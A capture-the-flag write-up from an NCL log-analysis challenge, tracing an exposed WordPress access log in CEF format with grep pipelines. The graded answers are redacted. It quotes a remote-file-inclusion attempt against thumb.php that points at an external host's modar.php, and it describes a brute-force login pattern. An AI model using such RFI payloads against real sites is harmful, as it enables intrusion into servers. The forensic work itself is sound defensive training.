---
type: writeup
source: NCL/Individual Game
event: NCL Individual Game
category: Log Analysis
difficulty: medium
status: solved
flags: redacted
tags: [writeup, log-analysis]
---

# Grand Theft Log

## Task

Cyber Command

A small nonprofit's website has been running the same WordPress install for years without much attention from an administrator. A security-conscious volunteer noticed the site's own web server log was reachable over HTTP and wants it to be reviewed for anything an attacker might have found first. Can you help?

- Q1 (10 pts): What version of the web server generated this log?
- Q2 (10 pts): What version of WordPress is running on this site?
- Q3 (10 pts): What is the path to the directory containing the web server logs that was publicly accessible? Answer format: `/directory-name/`
- Q4 (15 pts): One client didn't stop at browsing, they pulled the entire `access.log` file in a single request. What is the IP address responsible?
- Q5 (10 pts): How many bytes were transferred in that single request?
- Q6 (15 pts): Months earlier, a different IP had already tested the same file, but only walked away with part of it via an HTTP range request. What is that IP address?
- Q7 (10 pts): The IP address from Q6 had also tried exploiting a thumbnail-generation script to fetch a file from an external host. What is the FQDN it was trying to reach?
- Q8 (20 pts): On a single day, several unrelated IPs all authenticated to the login page using the exact same malformed absolute-URL request. How many unique IPs share this signature?

## Approach

A nonprofit WordPress site exposed its own web server log over HTTP. The task is to go through `access.log` and answer questions about the server, the CMS, the exposed log directory, and the attacker activity found inside.

Note: the raw `access.log` is large and was left in `~/PWN` (not copied into the vault).

### Initial recon

The file isn't a standard Apache combined log, it's CEF (Common Event Format), fixed pipe-and-space delimited fields:

```
Jul 20 2011 14:49:13 localhost CEF:0|Apache|httpd|2.4.43|200|Successful Request|1|src=166.161.50.194 requestMethod=GET request=/wp-admin/images/fav-arrow.gif?ver=20100531 proto=HTTP/1.1 out=241
```

Field breakdown:
- `CEF:0|Apache|httpd|2.4.43` = version:vendor:product:version
- `200|Successful Request` = HTTP status and message
- `src=` client IP, `requestMethod=`, `request=` path, `proto=`, `out=` bytes

Every field sits in a predictable position with simple delimiters, so `grep -oE` + `sort | uniq -c` answers everything, no full parser needed.

- 999 log lines spanning Jul 2011 to Jan 2014
- Single Apache version string on every line
- Tail of the log shows repeated `POST /wp-login.php`, a brute-force pattern

## Solution

### Q1: web server version

The CEF header carries the device vendor, product, and version. Identical on every line.

```bash
grep -oE 'CEF:0\|Apache\|httpd\|[0-9.]+' access.log | sort -u
# CEF:0|Apache|httpd|<ver>
```

- Q1: REDACTED

### Q2: WordPress version

WordPress appends its core version as a `?ver=` query string to assets under `wp-includes`. Filtering to that path isolates the core version from theme/plugin asset noise.

```bash
grep 'wp-includes' access.log | grep -oE 'ver=[0-9.]+' | sort | uniq -c | sort -rn
# -> /wp-includes/js/comment-reply.js?ver=<ver>
```

The broader `ver=` counts (`1.4.8`, `1.4.2`, etc.) are theme/plugin asset versions, ignored.

- Q2: REDACTED

### Q3: public log directory

Searching for log paths shows requests to the directory and its files, all returning 200 or 206 (success / partial content), which confirms the directory listing and log files really were served over HTTP.

```bash
grep -iE '/log' access.log | grep -oE 'request=[^ ]*' | sort | uniq -c | sort -rn
# request=/log/
# request=/log/access.log
# request=/log/error.log
```

Status check:

```bash
grep -E 'request=/log/' access.log | grep -oE 'CEF:0\|Apache\|httpd\|[0-9.]+\|[0-9]+'
# 11x |200, 1x |206, 1x |404
```

- Q3: REDACTED

### Q4: IP that pulled the entire access.log

Two clients fetched `/log/access.log`. The one that pulled the whole file returned status 200 (full success) with a huge byte count. The other returned 206 (see Q6).

```bash
grep -E 'request=/log/access\.log( |$)' access.log
# Oct 25 2013 ... src=<ip-A> ... |200| ... out=86067640
# Jun 21 2013 ... src=<ip-B> ... |206| ... out=141137
```

- Q4: REDACTED

### Q5: bytes transferred in that request

Read straight off the `out=` field of the 200 response above.

```bash
grep '<ip-A>' access.log | grep '/log/access.log' | grep -oE 'out=[0-9]+'
# out=86067640
```

- Q5: REDACTED (86067640)

### Q6: IP that grabbed only part of the file

The earlier fetch (Jun 2013) returned status 206 partial content delivered, the signature of an HTTP range request pulling only a slice of the file.

```bash
grep '|206|' access.log | grep 'access.log'
# Jun 21 2013 ... src=<ip-B> ... |206| ... out=141137
```

- Q6: REDACTED

### Q7: FQDN in the thumbnail RFI attempt

The same IP from Q6 abused `thumb.php`, whose `src=` param was pointed at an external URL (classic remote file inclusion). The value is URL-encoded (`%3A%2F%2F` = `://`, `%2F` = `/`), just decode it to read the host.

```bash
grep '<ip-B>' access.log | grep -i thumb
# ...thumb.php?src=http%3A%2F%2F<fqdn>%2Fmodar.php
```

Decoded, the FQDN is the host before `/modar.php`.

- Q7: REDACTED

### Q8: unique IPs sharing the malformed login signature

A malformed login uses an absolute URL in the request line (`POST http://host/wp-login.php/`) instead of the normal relative path (`POST /wp-login.php`). Filtering for that exact string and counting distinct `src=` values gives the answer. All hits fall on a single day (Nov 21 2013).

```bash
grep -F 'request=http://<host>/wp-login.php/ ' access.log \
  | grep -oE 'src=[0-9.]+' | sort -u | wc -l
```

The shared, oddly uniform request is the fingerprint of a single botnet/toolkit driving the login attempts.

- Q8: REDACTED

## Flag

REDACTED (all answers redacted; this is a live/graded NCL event)

## Lessons

- Identify the log format before parsing. This was CEF, not Apache combined, and the fixed delimiters made simple `grep -oE` extraction enough.
- WordPress leaks its core version through `?ver=` on `wp-includes` assets, so filter to that path to avoid theme/plugin version noise.
- Status codes tell the story: 200 (full read) vs 206 (range/partial) distinguished the two clients who touched `access.log`.
- Once a log is publicly readable, an attacker learns the exact CMS version (and its known CVEs) and maps the site, which is exactly the chain visible here (brute force plus an RFI probe against `thumb.php`).
